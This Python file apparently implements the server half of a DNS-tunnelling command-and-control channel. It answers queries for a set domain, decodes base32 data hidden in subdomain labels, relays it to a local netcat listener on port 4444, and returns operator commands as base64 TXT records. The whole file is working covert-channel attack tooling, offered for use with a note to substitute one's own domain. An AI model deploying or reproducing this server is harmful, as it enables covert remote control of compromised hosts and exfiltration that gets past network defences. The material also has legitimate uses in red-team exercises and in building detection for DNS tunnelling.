import io
import struct
import socketserver
import re
import socket
import base64
from io import BytesIO
import queue
import threading

q = queue.Queue()


HEADER = "!HBBHHHH"
HEADER_SIZE = struct.calcsize(HEADER)
DOMAIN_PATTERN = re.compile("^[A-Za-z0-9\-\.\_]+$")

INPUTDOMAIN = "send.reyals.net"   #use your own domian

PORT = 53

ncport = 4444

def incomingcommands(theconn,thequeue):
    while 1:
        data = theconn.recv(1024)
        if not data: break
        while len(data) > 189: #max length of base64 should be <= 255
            thequeue.put(base64.b64encode(data[0:189]).decode("ascii"))  
            data = data[189:]
        thequeue.put(base64.b64encode(data).decode("ascii"))


def fromBase32(encoded):
    try:
        mod = len(encoded) % 8
        if mod == 2:
            padding = "======"
        elif mod == 4:
            padding = "===="
        elif mod == 5:
            padding = "==="
        elif mod == 7:
            padding = "="
        else:
            padding = ""
        return base64.b32decode(encoded.upper() + padding)
    except:
        return b""

def inputHandler(query):
    data = query.replace(INPUTDOMAIN, "")
    if data.count(".") == 1: #this isn't from us
        print("Extra request")
        return ["ACK"]
    data = data.replace(".", "")
    if len(fromBase32(data)) > 0:
        conn.send(fromBase32(data))
    answers = []
    if q.empty():
        answers.append("ACK")
    else:
        answers.append(q.get_nowait())
    return answers

#sourced from https://github.com/SpiderLabs/DoHC2/blob/master/Server/DoHC2.py
class DNSHandler(socketserver.BaseRequestHandler):
    def handle(self):

        socket = self.request[1]
        data = self.request[0]
        data_stream = io.BytesIO(data)

        # Read header
        (request_id, header_a, header_b, qd_count, an_count, ns_count, ar_count) = struct.unpack(HEADER, data_stream.read(HEADER_SIZE))

        # Read questions
        questions = []
        for i in range(qd_count):
            name_parts = []
            length = struct.unpack("B", data_stream.read(1))[0]
            while length != 0:
                name_parts.append(data_stream.read(length).decode("us-ascii"))
                length = struct.unpack("B", data_stream.read(1))[0]
            name = ".".join(name_parts)

        if not DOMAIN_PATTERN.match(name):
            print("Invalid domain received: " + name)
            return

        (qtype, qclass) = struct.unpack("!HH", data_stream.read(4))

        questions.append({"name": name, "type": qtype, "class": qclass})

        #print("Got request for " + questions[0]["name"] + " from " + str(self.client_address[0]) + ":" + str(self.client_address[1]))
        print("[Incoming DNS Query] " + questions[0]["name"])

        query = questions[0]["name"]

        answers_response = []

        if INPUTDOMAIN in query:
            answers_response = inputHandler(query)

        # Make response (note: we don"t actually care about the questions, just return our canned response)
        response = io.BytesIO()

        # Header
        # Response, Authoriative
        response_header = struct.pack(HEADER, request_id, 0b10000100, 0b00000000, qd_count, len(answers_response), 0, 0)
        response.write(response_header)

        # Questions
        for q in questions:
          # Name
          for part in q["name"].split("."):
            response.write(struct.pack("B", len(part)))
            response.write(part.encode("us-ascii"))
          response.write(b"\x00")

          # qtype, qclass
          response.write(struct.pack("!HH", q["type"], q["class"]))

        # Answers
        print("[Response] %s " % (repr(answers_response)))
        for a in answers_response:
            response.write(b"\xc0\x0c") # Compressed name (pointer to question)
            response.write(struct.pack("!HH", 16, 1)) # type: TXT, class: IN
            response.write(struct.pack("!I", 0)) # TTL: 0
            response.write(struct.pack("!H", len(a) + 1)) # Record length
            response.write(struct.pack("B", len(a))) # TXT length
            response.write(a.encode("us-ascii")) # Text
        # Send response
        socket.sendto(response.getvalue(), self.client_address)



print("Waiting for netcat connection on port "+str(ncport))
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(("127.0.0.1", ncport))
sock.listen(1)
conn, addr = sock.accept()
print("Connection received, waiting for incoming clients")

t = threading.Thread(target = incomingcommands, args=(conn, q))
t.daemon = True 
t.start()

server = socketserver.ThreadingUDPServer(("", PORT), DNSHandler)
server.serve_forever()